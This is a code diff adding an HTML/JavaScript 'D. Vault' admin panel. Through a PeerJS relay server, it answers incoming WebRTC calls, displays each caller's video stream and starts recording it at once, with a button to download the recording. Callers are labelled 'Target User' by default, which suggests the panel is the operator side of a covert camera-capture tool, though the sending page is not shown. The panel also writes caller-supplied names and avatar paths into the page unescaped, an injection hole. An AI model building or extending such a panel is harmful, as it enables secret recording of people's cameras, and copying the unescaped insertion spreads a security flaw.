@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Admin Panel - D. Vault</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      width: 100vw;
+      height: 100vh;
+      height: 100dvh;
+      background: #0d0d0d url('1.jfif') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      position: fixed;
+      inset: 0;
+    }
+
+    .admin-wrapper {
+      width: 96%;
+      max-width: 1400px;
+      height: 94vh;
+      background: rgba(23, 23, 23, 0.3);
+      backdrop-filter: blur(25px);
+      -webkit-backdrop-filter: blur(25px);
+      border: 1px solid rgba(255, 255, 255, 0.4);
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .admin-header {
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.15);
+    }
+
+    .connection-status {
+      color: rgba(255, 255, 255, 0.9);
+      font-weight: 500;
+      font-size: 0.95em;
+      background: rgba(0, 0, 0, 0.25);
+      padding: 6px 16px;
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      letter-spacing: 0.3px;
+    }
+
+    .admin-body {
+      flex: 1;
+      padding: 15px;
+      overflow-y: auto;
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 15px;
+      align-content: start;
+    }
+
+    @media (max-width: 1100px) {
+      .admin-body { grid-template-columns: repeat(2, 1fr); }
+    }
+    @media (max-width: 650px) {
+      .admin-body { grid-template-columns: 1fr; }
+    }
+
+    .user-card {
+      background: rgba(0, 0, 0, 0.25);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 15px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .user-card.minimized .card-content-area {
+      display: none;
+    }
+
+    .card-header {
+      padding: 10px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: rgba(255, 255, 255, 0.05);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .user-info-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .card-avatar {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 1px solid rgba(255, 255, 255, 0.4);
+    }
+
+    .card-username {
+      color: white;
+      font-size: 0.85em;
+      font-weight: 600;
+    }
+
+    .card-actions {
+      display: flex;
+      gap: 6px;
+    }
+
+    .icon-btn {
+      background: none;
+      border: none;
+      color: rgba(255, 255, 255, 0.7);
+      cursor: pointer;
+      font-size: 0.9em;
+      padding: 2px 6px;
+      border-radius: 4px;
+      transition: background 0.2s;
+    }
+
+    .icon-btn:hover {
+      background: rgba(255, 255, 255, 0.15);
+      color: white;
+    }
+
+    .card-content-area {
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+    }
+
+    .video-container {
+      width: 100%;
+      height: 160px;
+      background: #000;
+      position: relative;
+    }
+
+    .video-container video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .card-footer {
+      padding: 8px 12px;
+      background: rgba(0, 0, 0, 0.15);
+    }
+
+    .standard-button {
+      width: 100%;
+      padding: 0.5em;
+      border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      outline: none;
+      background-color: rgba(255, 255, 255, 0.35);
+      color: white;
+      font-size: 0.8em;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      text-align: center;
+    }
+
+    .standard-button:hover {
+      background-color: rgba(255, 255, 255, 0.5);
+    }
+  </style>
+  <!-- PeerJS Library CDN -->
+  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+</head>
+<body>
+
+  <div class="admin-wrapper">
+    <div class="admin-header">
+      <div class="connection-status" id="globalStatus">Waiting for connection...</div>
+    </div>
+
+    <div class="admin-body" id="cardsContainer">
+      <!-- Jab tak koi user connect nahi hoga, ye khali rahega -->
+    </div>
+  </div>
+
+  <script>
+    const cardsContainer = document.getElementById('cardsContainer');
+    const globalStatus = document.getElementById('globalStatus');
+
+    const ADMIN_PEER_ID = 'dvault_admin_panel_master_id';
+    let adminPeer = null;
+
+    const activeRecorders = {};
+
+    function initAdminPeer() {
+      // Railway Server & STUN configuration added for robust cross-city connection
+      adminPeer = new Peer(ADMIN_PEER_ID, {
+        host: 'server-production-1d90.up.railway.app',
+        port: 443,
+        path: '/myapp',
+        secure: true,
+        config: {
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' }
+          ]
+        }
+      });
+
+      adminPeer.on('open', (id) => {
+        globalStatus.textContent = "Admin online. Waiting for connection...";
+      });
+
+      adminPeer.on('call', (call) => {
+        globalStatus.textContent = "Connected Users Active";
+
+        const metadata = call.metadata || {};
+        const username = metadata.name || 'Target User';
+        const avatar = metadata.avatar || '1.png';
+        const cardId = 'user-card-' + Math.random().toString(36).substring(2, 9);
+        
+        createCard(cardId, username, avatar);
+
+        const remoteVideo = document.getElementById(`video-${cardId}`);
+        call.answer();
+
+        call.on('stream', (remoteStream) => {
+          if (remoteVideo) {
+            remoteVideo.srcObject = remoteStream;
+            remoteVideo.play().catch(e => console.log("Autoplay prevented:", e));
+
+            const recorder = new MediaRecorder(remoteStream);
+            const chunks = [];
+
+            recorder.ondataavailable = (event) => {
+              if (event.data.size > 0) chunks.push(event.data);
+            };
+
+            recorder.start(1000); 
+            activeRecorders[cardId] = { recorder, chunks };
+          }
+        });
+
+        call.on('close', () => {
+          if (activeRecorders[cardId] && activeRecorders[cardId].recorder.state !== 'inactive') {
+            activeRecorders[cardId].recorder.stop();
+          }
+
+          const card = document.getElementById(cardId);
+          if (card) {
+            card.classList.add('minimized');
+            
+            const minBtn = card.querySelector('.minimize-btn');
+            if (minBtn) minBtn.textContent = '+';
+            
+            const nameEl = card.querySelector('.card-username');
+            if (nameEl) {
+              nameEl.textContent = username + ' (Offline)';
+              nameEl.style.color = '#ff6b6b';
+            }
+          }
+        });
+
+        call.on('error', (err) => {
+          console.error('Call error:', err);
+        });
+      });
+
+      adminPeer.on('error', (err) => {
+        console.error('Admin Peer error:', err);
+      });
+    }
+
+    function createCard(cardId, username, avatarSrc) {
+      const cardHTML = `
+        <div class="user-card" id="${cardId}">
+          <div class="card-header">
+            <div class="user-info-box">
+              <img src="${avatarSrc}" alt="User" class="card-avatar">
+              <span class="card-username">${username}</span>
+            </div>
+            <div class="card-actions">
+              <button class="icon-btn minimize-btn" title="Minimize">−</button>
+              <button class="icon-btn close-btn" title="Close">×</button>
+            </div>
+          </div>
+          <div class="card-content-area">
+            <div class="video-container">
+              <video autoplay playsinline muted id="video-${cardId}"></video>
+            </div>
+            <div class="card-footer">
+              <button type="button" class="standard-button download-btn" data-cardid="${cardId}">Download Video</button>
+            </div>
+          </div>
+        </div>
+      `;
+      cardsContainer.insertAdjacentHTML('beforeend', cardHTML);
+    }
+
+    document.addEventListener('click', (e) => {
+      if (e.target.classList.contains('minimize-btn')) {
+        const card = e.target.closest('.user-card');
+        card.classList.toggle('minimized');
+        e.target.textContent = card.classList.contains('minimized') ? '+' : '−';
+      }
+      
+      if (e.target.classList.contains('close-btn')) {
+        const card = e.target.closest('.user-card');
+        const cardId = card.id;
+        
+        if (activeRecorders[cardId]) {
+          if (activeRecorders[cardId].recorder.state !== 'inactive') {
+            activeRecorders[cardId].recorder.stop();
+          }
+          delete activeRecorders[cardId];
+        }
+        
+        card.remove();
+        if (cardsContainer.children.length === 0) {
+          globalStatus.textContent = "Waiting for connection...";
+        }
+      }
+
+      if (e.target.classList.contains('download-btn')) {
+        const btn = e.target;
+        const cardId = btn.getAttribute('data-cardid');
+        const recordData = activeRecorders[cardId];
+
+        if (recordData && recordData.chunks.length > 0) {
+          if (recordData.recorder.state !== 'inactive') {
+            recordData.recorder.requestData();
+          }
+
+          setTimeout(() => {
+            const blob = new Blob(recordData.chunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = `DVault_Record_${Date.now()}.webm`;
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+
+            const originalText = btn.textContent;
+            btn.textContent = 'Downloaded!';
+            btn.style.backgroundColor = '#22c55e';
+            btn.style.color = 'white';
+            
+            setTimeout(() => {
+              btn.textContent = originalText;
+              btn.style.backgroundColor = 'rgba(255, 255, 255, 0.35)';
+            }, 2000);
+          }, 300);
+          
+        } else {
+          alert("Abhi tak koi data record nahi hua. Chand seconds intizar karein.");
+        }
+      }
+    });
+
+    window.addEventListener('DOMContentLoaded', () => {
+      initAdminPeer();
+    });
+  </script>
+</body>
+</html>
